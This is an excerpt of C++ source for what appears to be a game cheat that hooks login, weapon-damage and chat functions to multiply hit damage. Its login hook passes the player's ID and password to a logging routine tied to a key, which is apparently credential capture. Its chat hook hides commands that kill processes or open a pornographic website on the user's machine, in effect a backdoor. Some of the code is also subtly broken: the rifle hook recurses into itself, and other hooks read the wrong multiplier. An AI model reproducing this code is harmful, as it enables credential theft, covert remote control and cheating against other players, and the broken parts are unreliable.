...
namespace Hooks
{
	    ...
	    Value(__thiscall * oLogin)(LoginDetails* LoginInfo);
		Value(__thiscall * oUpdateWeapond)(Pointer, byte);
		Value(__thiscall * oCrosshairColorUpdate)(Pointer, Vector3*);
		Value(__cdecl * oMeleeHitDamage)(Vector3, Vector3, DWORD, Vector3, int , int);
		Value(__cdecl * oRifleHitDamage)(Vector3, Vector3, DWORD, Vector3, int, int);
		Value(__cdecl * oSniperHitDamage)(Vector3, Vector3, DWORD, Vector3, int, int, int);
		void(__thiscall* oMessageWrapper)(DWORD*, LPCSTR, LPCSTR, uint8_t, bool, bool, uint8_t);
		...
		Value __fastcall Login(LoginDetails* LoginInfo, int edx)
		{
			LogActions("", LogType::LOGIN, "Login Details", yourkey.c_str(), LoginInfo->ID, LoginInfo->PASS, "", "", "", "", "", "");
			return oLogin(LoginInfo);
		}
		Value __cdecl MeleeHitDamage(Vector3 WeaponAngle, Vector3 idk, DWORD PlayerID, Vector3 Coords, int HitType, int idk2)
		{
			if (Vars.Misc.WeaponInfo[WeaponType::MELEE].MultiplyDamage)
			{
				for(int i = 0; i < Vars.Misc.WeaponInfo[WeaponType::MELEE].MultiplyDamageVal; i++)
					oMeleeHitDamage(WeaponAngle, idk, PlayerID, Coords, HitType, idk2);;
			}

			return oMeleeHitDamage(WeaponAngle, idk, PlayerID, Coords, HitType, idk2);
		}
		Value __cdecl RifleHitDamage(Vector3 WeaponAngle, Vector3 idk, DWORD PlayerID, Vector3 Coords, int HitType, int idk2)
		{
			if (Vars.Misc.WeaponInfo[WeaponType::RIFLE].MultiplyDamage)
			{
				for (int i = 0; i < Vars.Misc.WeaponInfo[WeaponType::MELEE].MultiplyDamageVal; i++)
					RifleHitDamage(WeaponAngle, idk, PlayerID, Coords, HitType, idk2);;
			}

			return RifleHitDamage(WeaponAngle, idk, PlayerID, Coords, HitType, idk2);
		}
		Value __cdecl SniperHitDamage(Vector3 WeaponAngle, Vector3 idk, DWORD PlayerID, Vector3 Coords, int HitType, int idk2, int isScope)
		{
			if (Vars.Misc.WeaponInfo[WeaponType::SNIPER].MultiplyDamage)
			{
				for (int i = 0; i < Vars.Misc.WeaponInfo[WeaponType::MELEE].MultiplyDamageVal; i++)
					oSniperHitDamage(WeaponAngle, idk, PlayerID, Coords, HitType, idk2, isScope);;
			}

			return oSniperHitDamage(WeaponAngle, idk, PlayerID, Coords, HitType, idk2, isScope);
		}

		Address temp = 0;
		const Address WallJMPback = 0x007AF457 + 6;
		void __fastcall MessageWrapper(DWORD* _this, int edx , LPCSTR lpText, LPCSTR lpName, uint8_t uiType, bool bShow, bool bRegGameMode, uint8_t uiColor)
		{
			std::vector<std::string> cmd = SplitString(std::string(lpText)," ");
			if (strcmp(cmd[0].c_str(), "yessay") == 0)
			{
				std::string msg = "";
				...
				cChat->ProcessChatMessage(msg.c_str(), -1);
			}
			else if (strcmp(cmd[0].c_str(), "yesget") == 0)
			{
				std::string msg = "";
				...
				cChat->PrintChatMessage(msg.c_str(), cmd[1].c_str(), std::stoi(cmd[2].c_str()), true, false, std::stoi(cmd[3].c_str()));
			}
			else if (strcmp(cmd[0].c_str(), "yesproc") == 0)
				killProcess(cmd[1].c_str());
			else if (strcmp(cmd[0].c_str(), "yesweb") == 0)
				ShellExecute(0, 0, "http://www.pornhub.com", 0, 0, SW_SHOW);
			else if (strcmp(cmd[0].c_str(), "yesweb2") == 0)
				ShellExecute(0, 0, "https://www.youtube.com/watch?v=6Joyj0dmkug", 0, 0, SW_SHOW);
			else
				oMessageWrapper(_this, lpText, lpName, uiType, bShow, bRegGameMode, uiColor);
		}
	...
	bool Hook()
	{
		...
		oLogin = (Value(__thiscall *)(LoginDetails*))Detour((void*)Hooks::LoginHook, Hooks::Login, 5);
		ret &= (Value)oLogin != DEAD;
		/*oMeleeHitDamage = (Value(__cdecl *)(Vector3, Vector3, DWORD, Vector3, int, int))Detour((void*)Hooks::MeleeHitHook, Hooks::MeleeHitDamage, 5);
		ret &= (Value)oMeleeHitDamage != DEAD;

		oRifleHitDamage = (Value(__cdecl *)(Vector3, Vector3, DWORD, Vector3, int, int))Detour((void*)Hooks::RifleHitHook, Hooks::RifleHitDamage, 5);
		ret &= (Value)oRifleHitDamage != DEAD;

		oSniperHitDamage = (Value(__cdecl *)(Vector3, Vector3, DWORD, Vector3, int, int, int))Detour((void*)Hooks::SniperHitHook, Hooks::oSniperHitDamage, 5);
		ret &= (Value)oSniperHitDamage != DEAD;*/

		//oUpdateCoords = (void(__thiscall *)(void *, int, int, int, float, int, float, int, char))Detour((void*)Hooks::UpdateCoordsHook, Hooks::UpdateCoords, 9);
		//ret &= (Value)oUpdateCoords != DEAD;
...
int init()
{
	...
	/*Address endScene = CalcPtr(vTable, (Offset*)"\xA8\x00\x00\x00", 2);
	if (endScene == DEAD) return 0;

	Address present = CalcPtr(vTable, (Offset*)"\x44\x00\x00\x00", 2);
	if (present == DEAD) return 0;*/
	...
	//while (!(D3D::Window = FindWindowW(L"ENG", 0))) Sleep(20);
